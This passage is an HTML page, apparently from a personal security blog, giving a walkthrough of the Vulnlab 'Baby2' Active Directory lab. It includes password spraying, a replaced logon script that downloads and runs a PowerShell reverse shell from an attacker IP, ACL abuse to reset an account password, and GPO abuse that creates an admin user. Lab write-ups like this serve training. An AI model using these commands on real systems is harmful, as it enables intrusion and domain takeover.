@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object AbuseIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Baby2” domain envir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Baby2">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/03/16/VL-Baby2/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object AbuseIn this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Baby2” domain envir">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/shares-acess.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/netlogon.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/apps-share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/home-share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/smb-users-access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/carl.more-shares.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/possible-path.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/shell-amelina.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/genericall.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/gpo-id.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Baby2/john-user.png">
+<meta property="article:published_time" content="2025-03-15T22:56:56.000Z">
+<meta property="article:modified_time" content="2025-05-23T10:41:31.800Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Baby2/shares-acess.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Baby2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/18/VL-Breach/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/14/VL-Retro2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/16/VL-Baby2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&text=VL-Baby2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&is_video=false&description=VL-Baby2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Baby2&body=Check out this article: https://panosoikogr.github.io/2025/03/16/VL-Baby2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&title=VL-Baby2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&name=VL-Baby2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/16/VL-Baby2/&t=VL-Baby2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User"><span class="toc-number">1.2.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shares"><span class="toc-number">1.2.1.</span> <span class="toc-text">Shares</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NETLOGON"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">NETLOGON</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apps"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Apps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Home"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">Home</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">1.2.2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bloodhound"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LOGIN-VBS"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">LOGIN.VBS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROOT"><span class="toc-number">1.3.</span> <span class="toc-text">ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shell-as-Amelia-Griffiths"><span class="toc-number">1.3.1.</span> <span class="toc-text">Shell as Amelia.Griffiths</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO-Abuse"><span class="toc-number">1.3.2.</span> <span class="toc-text">GPO Abuse</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Baby2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-15T22:56:56.000Z" class="dt-published" itemprop="datePublished">2025-03-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Vulnlab-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse"><a href="#Vulnlab-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse" class="headerlink" title="Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse"></a>Vulnlab Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse</h1><p>In this comprehensive VulnLab walkthrough, I’ll demonstrate how to penetrate the “Baby2” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and weak password policies, we’ll progress through login script manipulation for initial access, lateral movement via domain user enumeration, and ultimately achieve domain administrator privileges through WriteDacl abuse and Group Policy Object exploitation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, password spraying attacks, VBS script injection, domain privilege escalation through ACL manipulation, and GPO abuse for administrative access. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-14 23:10:17Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-03-14T23:11:42+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY2</span><br><span class="line">|   NetBIOS_Domain_Name: BABY2</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: baby2.vl</span><br><span class="line">|   DNS_Computer_Name: dc.baby2.vl</span><br><span class="line">|   DNS_Tree_Name: baby2.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-14T23:11:01+00:00</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-14T23:11:04</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+
+<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.89.250 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/shares-acess.png" alt="shares-acess"></p>
+<h4 id="NETLOGON"><a href="#NETLOGON" class="headerlink" title="NETLOGON"></a>NETLOGON</h4><p>Looking into the <code>Netlogon</code> share we find a <code>login.vbs</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/NETLOGON -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/netlogon.png" alt="netlogon"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Sub MapNetworkShare(sharePath, driveLetter)</span><br><span class="line">    Dim objNetwork</span><br><span class="line">    Set objNetwork = CreateObject(&quot;WScript.Network&quot;)    </span><br><span class="line">  </span><br><span class="line">    &#x27; Check if the drive is already mapped</span><br><span class="line">    Dim mappedDrives</span><br><span class="line">    Set mappedDrives = objNetwork.EnumNetworkDrives</span><br><span class="line">    Dim isMapped</span><br><span class="line">    isMapped = False</span><br><span class="line">    For i = 0 To mappedDrives.Count - 1 Step 2</span><br><span class="line">        If UCase(mappedDrives.Item(i)) = UCase(driveLetter &amp; &quot;:&quot;) Then</span><br><span class="line">            isMapped = True</span><br><span class="line">            Exit For</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    If isMapped Then</span><br><span class="line">        objNetwork.RemoveNetworkDrive driveLetter &amp; &quot;:&quot;, True, True</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    objNetwork.MapNetworkDrive driveLetter &amp; &quot;:&quot;, sharePath</span><br><span class="line">    </span><br><span class="line">    If Err.Number = 0 Then</span><br><span class="line">        WScript.Echo &quot;Mapped &quot; &amp; driveLetter &amp; &quot;: to &quot; &amp; sharePath</span><br><span class="line">    Else</span><br><span class="line">        WScript.Echo &quot;Failed to map &quot; &amp; driveLetter &amp; &quot;: &quot; &amp; Err.Description</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    Set objNetwork = Nothing</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\apps&quot;, &quot;V&quot;</span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\docs&quot;, &quot;L&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h4><p>On the <code>Apps</code> share we find a changelog and a .lnk file pointing into the <code>/SYSVOL/scripts/ login.vbs</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/apps -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/apps-share.png" alt="apps-share"></p>
+<p>CHANGELOG:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[0.2]</span><br><span class="line"></span><br><span class="line">- Added automated drive mapping</span><br><span class="line"></span><br><span class="line">[0.1]</span><br><span class="line"></span><br><span class="line">- Rolled out initial version of the domain logon script      </span><br></pre></td></tr></table></figure>
+<h4 id="Home"><a href="#Home" class="headerlink" title="Home"></a>Home</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.89.250/homes -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/home-share.png" alt="home-share"><br>Possible Usernames:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Amelia.Griffiths</span><br><span class="line">Carl.Moore</span><br><span class="line">Harry.Shaw</span><br><span class="line">Joan.Jennings</span><br><span class="line">Joel.Hurst</span><br><span class="line">Kieran.Mitchell</span><br><span class="line">library</span><br><span class="line">Lynda.Bailey</span><br><span class="line">Mohammed.Harris</span><br><span class="line">Nicola.Lamb</span><br><span class="line">Ryan.Jenkins</span><br></pre></td></tr></table></figure>
+
+<p>Also we can find all of the usernames using <code>lookupsid</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.89.250 -no-pass</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1000: BABY2\DC$ (SidTypeUser)</span><br><span class="line">1101: BABY2\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: BABY2\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: BABY2\gpoadm (SidTypeUser)</span><br><span class="line">1104: BABY2\office (SidTypeGroup)</span><br><span class="line">1105: BABY2\Joan.Jennings (SidTypeUser)</span><br><span class="line">1106: BABY2\Mohammed.Harris (SidTypeUser)</span><br><span class="line">1107: BABY2\Harry.Shaw (SidTypeUser)</span><br><span class="line">1108: BABY2\Carl.Moore (SidTypeUser)</span><br><span class="line">1109: BABY2\Ryan.Jenkins (SidTypeUser)</span><br><span class="line">1110: BABY2\Kieran.Mitchell (SidTypeUser)</span><br><span class="line">1111: BABY2\Nicola.Lamb (SidTypeUser)</span><br><span class="line">1112: BABY2\Lynda.Bailey (SidTypeUser)</span><br><span class="line">1113: BABY2\Joel.Hurst (SidTypeUser)</span><br><span class="line">1114: BABY2\Amelia.Griffiths (SidTypeUser)</span><br><span class="line">1602: BABY2\library (SidTypeUser)</span><br><span class="line">2601: BABY2\legacy (SidTypeGroup)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>After some password spraying we can see that the user <code>library</code> and <code>Carl.Moore</code> have the same password as their usernames and now we get more access to the shares</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u usernames.txt  -p usernames.txt --no-bruteforce --continue-on-success</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/smb-users-access.png" alt="smb-users-access"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u &quot;Carl.Moore&quot; -p &quot;Carl.Moore&quot; --shares</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/carl.more-shares.png" alt="carl.more-shares"><br>We got <code>Read</code> on <code>SYSVOL</code> also now we can <code>READ</code> and <code>WRITE</code> on home, docs, and app share!</p>
+<h4 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h4><p>Also now we have ldap access so we will run <code>bloodhound-python</code> or <code>netexec</code> to get a view of the domain.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.89.250 -u &#x27;library&#x27; -p &#x27;library&#x27;  --bloodhound --dns-server 10.10.89.250 -c All --dns-tcp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/possible-path.png" alt="possible-path"></p>
+<h4 id="LOGIN-VBS"><a href="#LOGIN-VBS" class="headerlink" title="LOGIN.VBS"></a>LOGIN.VBS</h4><p>We will be changing the login.vbs script to the one below so we can get a shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.109.97/SYSVOL -U &#x27;Carl.Moore&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get login.vbs</span><br></pre></td></tr></table></figure>
+
+<p>Now we change the login.vbs to:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set oShell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">oShell.Run(&quot;powershell.exe -nop -w hidden -ep bypass -c IEX(IWR http://10.8.5.195:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.8.5.195 3001&quot;)</span><br></pre></td></tr></table></figure>
+<p><strong>Here is the ps1 shell I use:</strong> <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/ConPtyShell">https://github.com/antonioCoco/ConPtyShell</a></p>
+<p>And start our listener and wait for someone to login</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure>
+
+<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><h3 id="Shell-as-Amelia-Griffiths"><a href="#Shell-as-Amelia-Griffiths" class="headerlink" title="Shell as Amelia.Griffiths"></a>Shell as Amelia.Griffiths</h3><p><img src="/images/Baby2/shell-amelina.png" alt="shell-amelina"></p>
+<p>We noticed that Amelia was part of the legacy group. Earlier we identified that the legacy group has <code>WriteDacl</code> over the <code>GPOADM</code> user. Following the bloodhound walkthrough, first we give the legacy group <code>GenericAll</code> permission over <code>GPOADM</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;GPOADM&quot; -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Baby2/genericall.png" alt="genericall"><br>Now that we have <code>GenericAll</code> we changed the password of the <code>GPOADM</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$UserPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainUserPassword -Identity &quot;GPOADM&quot; -AccountPassword $UserPassword</span><br></pre></td></tr></table></figure>
+
+<h3 id="GPO-Abuse"><a href="#GPO-Abuse" class="headerlink" title="GPO Abuse"></a>GPO Abuse</h3><p>As we saw earlier, <code>GPOADM</code> has <code>GenericAll</code> over the <code>Default Domain Policy</code> so we will use a tool named <code>pyGPOAbuse</code> to help us exploit it. <a target="_blank" rel="noopener" href="https://github.com/Hackndo/pyGPOAbuse">https://github.com/Hackndo/pyGPOAbuse</a></p>
+<p>We grab the GPO-ID and then we will run the python file that creates a user.<br><img src="/images/Baby2/gpo-id.png" alt="gpo-id"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pygpoabuse.py &#x27;baby2.vl/gpoadm:Password123!&#x27; -gpo-id &#x27;6AC1786C-016F-11D2-945F-00C04FB984F9&#x27; -f</span><br></pre></td></tr></table></figure>
+<p>After running the command we need to <code>gpupdate</code> so the changes get applied</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+<p>And we will see a new user that we created <code>john:H4x00r123..</code> in the local administrators group:<br><img src="/images/Baby2/john-user.png" alt="john-user"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.109.97 -u &#x27;john&#x27; -p &#x27;H4x00r123..&#x27;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb" title="https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb">https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
